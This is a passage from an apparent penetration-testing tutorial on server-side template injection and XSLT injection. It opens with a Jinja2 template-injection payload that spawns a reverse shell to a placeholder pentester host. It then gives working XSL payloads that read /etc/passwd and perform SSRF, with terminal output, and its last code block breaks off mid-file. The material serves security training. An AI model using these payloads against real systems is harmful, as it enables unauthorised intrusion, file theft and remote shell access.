{{''.__class__.__mro__[1].__subclasses__()[214]()._module.__builtins__['__import__']('os').popen('python -c \'socket=__import__("socket");os=__import__("os");pty=__import__("pty");s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<PENTESTER_IP>",<PENTESTER_PORT>));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")\'').read()}}

```

Now, proceed to this section's exercise and complete the objective either by crafting the payload yourself or through a shell obtained with the help of `tplmap`.


# Attacking XSLT

* * *

Extensible Stylesheet Language Transformations ( `XSLT`) is an XML-based language usually used when transforming XML documents into HTML, another XML document, or PDF. Extensible Stylesheet Language Transformations Server-Side Injection can occur when arbitrary XSLT file upload is possible or when an application generates the XSL Transformation’s XML document dynamically using unvalidated input from the user.

Depending on the case, XSLT uses built-in functions and the XPATH language to transform a document either in the browser or the server. Extensible Stylesheet Language Transformations are present in some web applications as standalone functionality, SSI engines, and databases like Oracle. At the time of writing, there are 3 ( [1](https://www.w3.org/TR/xslt-10/), [2](https://www.w3.org/TR/xslt20/), [3](https://www.w3.org/TR/xslt-30/)) XSLT versions. Version 1 is the least interesting from an attacker's perspective due to the limited built-in functionality. The most used XSLT-related projects are LibXSLT, Xalan, and Saxon. To exploit XSLT Injections, we need to store malicious tags on the server-side and access that content.

Let us experiment with XSLT by using a combination of Saxon with XSLT Version 2.

First, install the required packages on Pwnbox or a local VM, as follows:

#### Installation of required packages

```shell
sudo apt install default-jdk libsaxon-java libsaxonb-java

```

Next, create the following files:

#### transformation.xsl

```xml
<?xml version="1.0" encoding="UTF-8"?>
<xsl:stylesheet version="1.0"
xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
<xsl:template match="/">
  <html>
  <body>
    <h2>My CD Collection</h2>
    <table border="1">
      <tr bgcolor="#9acd32">
        <th>Title</th>
        <th>Artist</th>
      </tr>
      <tr>
        <td><xsl:value-of select="catalog/cd/title"/></td>
        <td><xsl:value-of select="catalog/cd/artist"/></td>
      </tr>
    </table>
  </body>
  </html>
</xsl:template>
</xsl:stylesheet>

```

We need to understand the XSLT format to see how the transformation works.

- The first line is usually the XML version and encoding
- Next, it will have the XSL root node `xsl:stylesheet`
- Then, we will have the directives in `xsl:template match="<PATH>"`. In this case, it will apply to any XML node.
- After that, the transformation is defined for any item in the XML structure matching the previous line.
- To select certain items from the XML document, XPATH language is used in the form of `<xsl:value-of select="<NODE>/<SUBNODE>/<VALUE>"/>`.

To see the results, we will use the command line parser. This can be done as follows:

#### Transformation through the terminal

```shell
saxonb-xslt -xsl:transformation.xsl catalogue.xml

Warning: at xsl:stylesheet on line 3 column 50 of transformation.xslt:
  Running an XSLT 1.0 stylesheet with an XSLT 2.0 processor
<html>
   <body>
      <h2>My CD Collection</h2>
      <table border="1">
         <tr bgcolor="#9acd32">
            <th>Title</th>
            <th>Artist</th>
         </tr>
         <tr>
            <td>Empire Burlesque</td>
            <td>Bob Dylan</td>
         </tr>
      </table>
   </body>
</html>

```

The following file can be used to detect the underlying preprocessor.

#### detection.xsl

```xml
<?xml version="1.0" encoding="UTF-8"?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
<xsl:output method="html"/>
<xsl:template match="/">
    <h2>XSLT identification</h2>
    <b>Version:</b> <xsl:value-of select="system-property('xsl:version')"/><br/>
    <b>Vendor:</b> <xsl:value-of select="system-property('xsl:vendor')" /><br/>
    <b>Vendor URL:</b><xsl:value-of select="system-property('xsl:vendor-url')" /><br/>
</xsl:template>
</xsl:stylesheet>

```

Let us now run the previous command, but this time, using the detection.xsl file.

#### Transformation through the terminal

```shell
saxonb-xslt -xsl:detection.xsl catalogue.xml

Warning: at xsl:stylesheet on line 2 column 80 of detection.xsl:
  Running an XSLT 1.0 stylesheet with an XSLT 2.0 processor
<h2>XSLT identification</h2><b>Version:</b>2.0<br><b>Vendor:</b>SAXON 9.1.0.8 from Saxonica<br><b>Vendor URL:</b>http://www.saxonica.com/<br>

```

Based on the preprocessor, we can go to the XSLT documentation for this version to identify functions of interest, such as the below.

- `unparsed-text` can be used to read local files.

#### readfile.xsl

```xml
<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:abc="http://php.net/xsl" version="1.0">
<xsl:template match="/">
<xsl:value-of select="unparsed-text('/etc/passwd', 'utf-8')"/>
</xsl:template>
</xsl:stylesheet>

```

#### Transformation through the terminal

```shell
saxonb-xslt -xsl:readfile.xsl catalogue.xml

Warning: at xsl:stylesheet on line 1 column 111 of readfile.xsl:

```

- `xsl:include` can be used to perform SSRF

We can also mount SSRF attacks if we have control over the transformation.

#### ssrf.xsl

```xml
<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:abc="http://php.net/xsl" version="1.0">
<xsl:include href="http://127.0.0.1:5000/xslt"/>
<xsl:template match="/">
</xsl:template>
</xsl:stylesheet>

```

#### Transformation through the terminal

```shell
saxonb-xslt -xsl:ssrf.xsl catalogue.xml

Warning: at xsl:stylesheet on line 1 column 111 of ssrf.xsl:
  Running an XSLT 1.0 stylesheet with an XSLT 2.0 processor

```

```shell

```

Check the different responses above when we hit an open or closed port. If you want to try this yourself in Pwnbox or a local machine, try executing the `saxonb-xslt` command above one time with nothing listening on port 5000 and one time with an HTTP server listening on port 5000 ( `sudo python3 -m http.server 5000` in a separate tab or terminal).

We presented some tech-stack-identification XSL files at the beginning of this section. Below is one more, larger than the previous ones. Try using it to reproduce the example above.

#### fingerprinting.xsl

```xml
<?xml version="1.0" encoding="ISO-8859-1"?>

 </xsl:if>
</xsl:template>
</xsl:stylesheet>

```
